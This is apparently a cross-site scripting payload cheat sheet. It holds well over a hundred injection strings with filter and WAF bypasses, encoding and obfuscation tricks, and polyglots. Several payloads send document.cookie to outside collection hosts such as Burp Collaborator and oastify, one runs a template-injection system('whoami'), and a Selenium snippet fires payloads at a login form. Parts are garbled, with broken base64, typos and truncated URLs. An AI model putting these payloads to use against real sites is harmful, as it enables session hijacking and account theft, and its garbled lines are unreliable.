/FontMatrix [1 2 3 4 5 (0\\); alert\\('foobar')]
xploring Cross-Site Scripting (XSS): 

<img
onload="eval(atob('2G9jdW1lbnQubG9jYXRpb249ImhodHA6Ly9saXNOZXJuSVAvlitkb2
NIbWVudC5jb29raWU=)">

<A HREF="http://6	6.000146.0x7.147/">ZORAXSS</A>

<A HREF="//google">XSS</A>

<A HREF="http://ha.ckers. org@google">XSS</A>


<A HREF="http://google:ha.ckers.org">XSS</A>

<A HREF="http://www.gohttp://www.google.com/ogle.com/">XSS</A>

<A HREF="http://www.gohttp://www.google. com/ogle.com/">XSS</A>

<svg/onload=alert('XSs)>

Set.constructor 'alert\x28document. domain \x29
<img src=1 onerror=alert(1)>
<iframe src=javascript:alert(1)>
data:text/html,<img src=1 onerror=alert(1)>
data:text/html,<iframe src-javascript:alert(1)>
<script src=data:,alert(1)>
<script src=-//brutelogic.com.br/1.js>
` ${@print(system('whoami'))} `
`<base href="alert(1)" onfocus="a = /\/([^/]+)$/.exec(baseURI); eval(a[1]);" tabindex=1 style="display:block" autofocus></base>`
`<img%20hrEF="x"%20sRC="data:x,"%20oNLy=1%20oNErrOR=prompt1>`
`<img+src=oNlY=1+ onerror="alert(['a', 'x', 'b', 'x', 'c', 's'].map(c => c.replace(/[abc]/g, '')).join(''))">`
`<img+src=oNlY=1+ onerror="alert(['x', String.fromCharCode(121), 'x', 's'].filter(c => c.charCodeAt(0) !== 121).join(''))">`
`%3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E`
`<img/src/onerror=setTimeout(atob(/YWxlcnQoMTMzNyk/.source))>`
`<details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle="prompt(document.cookie);">`
`?foobar=<foo%20bar=%250a%20onclick=<iframe src='https://abc123.ngrok.io/phish'></iframe> `
`?msg=%3Csvg%2Fonload%3Dalert%28%22XSS%22%29%20%3E`, `<svg/onload=alert("XSS") >`
`?utm_source=abc%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3e`
`<a+HREF="%26%237 javascrip%26%239t: alert%261par;document .domain) *>`
`â€/>&_lt;_script>alert(1)&_lt;/scr_ipt>â€/>`
`<a href=[â€‹]"â€‹ onmouseover=prompt(1)//">XYZ</a>`
`<script //>//confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')//</script //`
`<blink/onmouseover=prompt(1)>OnMouseOver {Firefox & Opera}`
`<svg> <foreignObject width="100%" height="100%"> <body> <iframe src='javascript:confirm(10)'></iframe> </body> </foreignObject> </svg>`
`<script>var a=document.createElement("a");a.href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==";a.click();</script>`
`jaVasCript:/--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[/[]/+alert(1)//'>`
`<svg%0Aonauxclick=0;[1].some(confirm)//`
`<svg onload=alert%26%230000000040"")>`
`<a/href=j	a	v	asc
ri	pt:(a	l	e	r	t	(1))>`
`<svg onx=() onload=(confirm)(1)>`
`<svg onx=() onload=(confirm)(document.cookie)>`
`<svg onx=() onload=(confirm)(JSON.stringify(localStorage))>`
`Function("\x61\x6c\x65\x72\x74\x28\x31\x29")();`
`"><img%20src=x%20onmouseover=prompt%26%2300000000000000000040;document.cookie%26%2300000000000000000041;`
`Function("\x61\x6c\x65\x72\x74\x28\x31\x29")();`
`"><onx=[] onmouseover=prompt(1)>`
<body onload=alert('John_Theose')>""
KnoXSS XSS Payload  -  confirm?.(1)
<img src=x onerror=alert()>
<img/src=x onerror=alert()>
<img src="x"/onerror=alert()>
<img src="x"onerror=alert()>
<img\nsrc="x"onerror=alert()>
<img src="x"> // this shows you can inject html into website but you cannot execute javascript code
<iframe srcdoc="<script>alert(document.domain)</script>"></iframe>
<iframe srcdoc="<script src=whitelisteddomain.com></script>"></iframe>
%2527%2520onfocus%253D%2527alert%25281%2529%2527%2520autofocus%253D%2527
<a href=[0x0b]xss" onfocus=prompt(1) autofocus fragment="
<button%20popovertarget=x>Click%20me</button><img%20onbeforetoggle=alert(1)%20popover%20id=x>XSS
 
String[] xssPayloads = {
 "<script>alert('XSS Attack!');</script>",
 "<img src='x' onerror='alert(\"XSS Attack!\")'>",
 "<a href=\"javascript:alert('XSS Attack!')\">Click Me</a>"
 };
<script>alert(\"1\");</script>";

for (String payload : xssPayloads) {
 
// Clear the fields
 usernameField.clear();
 passwordField.clear(); 
 usernameField.sendKeys(![alt](javascript:alert('xss'))

);
 passwordField.sendKeys("securepassword"); 
// Click the login button
 loginButton.click();
 
// Check if the alert is present (indicating XSS)

<script>new Image().src=”burp.burpcollaborator.net/abc.php?output="+document.cookie;</script>
""><script src=yourdomain></script> in the replace section

<iframe src="j.oastify.com" display:none onload="this.src+='<img src=x onerror=document.cookie()>'"</iframe>
">img/src=k.oastify.com
">script/src=k.oastify.com</script>
"><script src="9.oastify.com"></script>
script><svg/onload=prompt`{document.cookie}`>

javascript:alert(document.domain); --> javaDISABLEscript:alert(document.domain);
java\nscript:alert(document.domain);// --> success

<iframe %00 src="	javascript:prompt(document.cookie)	"%00>

 <script src="data:text/javascript,alert(1)"></script>
 <dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x>
 \u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e
 \u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e
 <dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x>
 ?email=test@gmail.com%27\%22%3E%3Csvg/onload=alert(/xss/)%3E
 </p>"><iframe/src=javascript:alert%26%23x000000028%3b)>karem
 "><svg%20onload=prompt%26%230000000040document.domain)>
 %27%22%3e%3csVg%20onLoad%3dproMpt%26%230000000040doCument.doMain%29%3e@gmail.com
 <Svg Only=1  onload=confirm(1)>
 <SvG><set%0Aonbegin%0A=%0aa=confirm;a%28%60xss%60)/x>
 <Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>
 test<style><img src="</style><img src=x onerror=alert(123)//">
 <iframe src='jAvAScRiPt:alert`1337`'</iframe>
 <img src="x:gif" onerror="window['al\u0065rt'](0)"></img>
 <SvG><set%0Aonbegin%0A=%0aa=confirm;a%28%60xss%60)/x>
 email field =>  test@gmail.com'\"><svg/onload=alert(/xss/)>
 email field =>  "<iframe/onload=eval(atob(location.hash.substring(1)))>"@calc.sh
 <Img Src=OnXSS OnError=confirm(1)>

 magazine.atavist.com/category/%22%2…

 magazine.atavist.com/category/0%3Bh…

 magazine.atavist.com/category/%22%3…

 "/*\"/*`/*' /*</template> </textarea></noembed></noscript></title> </style></script>--><svg onload=/*<html/*/onmouseover=alert()//>
data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTIGJ5IFZpY2tpZScpPC9zY3JpcHQ+"
data:text/html,<script>alert(1)</script>
<select><noembed></select><script x='a@b'a>

 "><svg+onload=alert(document.domain)>
 "'><sVg/onload=alert(document.cookie)>
 ">%0At%0DXSS
 "'><sVg/onload=alert.bind()(document.cookie)>
 "'><xmp><p title="</xmp><svg/onload=alert.bind()(document.domain)>
 "'><svg/onload=alert(document.domain)>
javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.cookie
"><a nope="%26quot;x%26quot;"onmouseover="Reflect.get(frames,'ale'+'rt')(Reflect.get(document,'coo'+'kie'))">
"><button popovertarget=x>Click me</button> <input type="hidden" value="y" popover id=x onbeforetoggle=alert(document.cookie)>
hello1\"></span><button popovertarget=x>Click me</button><input type=hidden value=y popover id=x onbeforetoggle=prompt(document.cookie)>
"><button%20popovertarget=x>Click%20me</button>%20<input%20type="hidden"%20value="y"%20popover%20id=x%20onbeforetoggle=alert(document.cookie)>
#"></div><a href= javascript:alert(document.domain)

<div onpointerover="javascript:eval(decodeURIComponent(String.fromCharCode(97, 108, 101, 114, 116, 40, 100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110, 41)))" style="width:100%;height:100vh;"></div>
<div onpointerover="javascript:alert(document.domain)" style="width:100%;height:100vh;"></div>
\u0022\u003c%26quot;%26gt;%26lt;"';}};“></SCRIPT><img src=x onerror=alert(69)>${{7*7}}
'"><script>alert('bug4y0u')</script>
"><div onmouseover="alert('XSS');">Hello :)
'"><img src=1 onerror="alert('bug4y0u')">
'"><img src=1 onkarem=1 onerror="alert('bug4y0u')">
"}}}}}}}}}}}}}}}}"><h1>bug4y0u</h1><svg><circle><set onbegin=prompt(document.cookie) attributename=fill></script>
<script/src=//6a%2elv></script>
%253c%252fscript%253e%253cscript%253ealert%2528document.cookie%2529%253c%252fscript%253e
%25253c%25252fscript%25253e%25253cscript%25253ealert%252528document.cookie%252529%25253c%25252fscript%25253e
'"></script><script>alert(document.cookie)</script>
%27"accesskey="x" onclick="alert(document.cookie)" x="
"><u>XSS Vulnerability</u><marquee+onstart='alert(document.cookie)'>XSS
<details/open=/open/href=/data=;+ontoggle="(alert)(document.cookie)
"><iframe/src=javascript:alert%26%23x000000028%3b)>
%22%3E%3Ciframe/src%3Djavascript%3Aalert%2526%2523x000000028%253b%29%3E%0A
<svg onload=prompt%26%230000000040document.domain)>
"><button%20popovertarget=x>Click%20me</button>%20<input%20type="hidden"%20value="y"%20popover%20id=x%20onbeforetoggle=alert(document.cookie)>
"><a href="javascript:alert('xss')">clickme</a>
<svg onload=prompt%26%230000000040document.domain)>
'"><script>alert('bug4y0u')</script>@gmail.com
%0Dalert`1`//
"<script>alert</script>"@gmail.com
"><img src=1 OnErRoR=alert('xss')>
'"><script src=xss.report/c/></script>
'`><\x00img src=xxx:x onerror=javascript:alert(1)>
<iframe srcdoc="<script>alert('XSS')</script>"></iframe>
"><A%20%252F=""Href=%20JavaScript:k=%27a%27,top[k%2B%27lert%27](origin)>
"><A /=""Href= JavaScript:k='a',top[k+'lert'](origin)>
"} </script> <script>fetch('https://<Collaborator>', {method: 'POST',mode: 'no-cors',body:document.cookie});</script>//
<DiV sTylE="WidTH:100%;HeIgHt:100vH;" oNpOINteROvEr="var _0x1abc=['\x63','\x6F','\x6E','\x73','\x74','\x72','\x75','\x63','\x74','\x6F','\x72'];var _0x2bcd=['\x61','\x6C','\x65','\x72','\x74','\x28','\x64','\x6F','\x63','\x75','\x6D','\x65','\x6E','\x74','\x2E','\x64','\x6F','\x6D','\x61','\x69','\x6E','\x29'];[][_0x1abc.join('')][_0x1abc.join('')](_0x2bcd.join(''))((97^0)===97?1:0);"></dIV>

<svg onload=eval(location.hash.slice(1))>
Put this at the end of the URL:
#with(document)body.appendChild(createElement('script')).src='//domain'
#with(document)body.appendChild(createElement('script')).src='//zora.co'
/?xss=<svg/onload=eval(`'`+URL)>#';alert(document.domain)
<svg/onload=eval(`'`+baseURI)>#';alert(document.domain)
http://localhost/index.php?xss=<svg/onload=eval(`'`+baseURI)>#';PAYLOADHERE
Function`alert\`xss\````
var a = document.createElement("a");
a.href = "portswigger-labs.net/xss/xss.php?x=<script>eval(name)<\/script>";
a.target = "alert(origin)";
document.body.appendChild(a);
a.click();
document.write(), eval(). Stay safe! 🔒
"/></div><div/OnpOinTeReNter=eval("var u='nt.c'.concat('ook'.concat('ie'));confirm(eval('do'.concat('cume'.concat(u))))")>click here<input type="hidden=alert  
'a1l2e3r4t'.replace(/(.).(.).(.).(.).(.)/g, (match, $1, $2, $3, $4, $5) => { throw{shahmidoe:onerror=this[$1+$2+$3+$4+$5]()}=0, 1337;});
<svg onload=onerror=eval,new'\u0022-alert\x281\x29//'>
{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}

let encoder = new TextEncoder(); 
let buf = new Uint8Array(8); encoder.encodeInto('alert(1)', buf); eval(String.fromCharCode(...buf));

Notification.requestPermission().then(() => eval('alert(1)')); 
navigator.mediaDevices.getUserMedia({ video: true }).then(() => eval('alert(1)')); 
navigator.geolocation.getCurrentPosition(() => eval('alert(1)'));
new Notification('XSS Alert', { body: 'Click me!' }).onclick = function() { eval('alert(1)'); };
document.body.requestPointerLock();
document.addEventListener('pointerlockchange', () => eval('alert(1)'));
MutationObserver(()=>{eval('alert(1)')}).observe(document.body, {childList: true});
braille is much better for blind XSS lol
eval((`⡡⡬⡥⡲⡴⠨⠧⡲⡡⡰⡨⡺⡥⡲⠧⠩`.split(``).map(function(c){return String.fromCharCode(c.charCodeAt()-10240);}).join(``)));

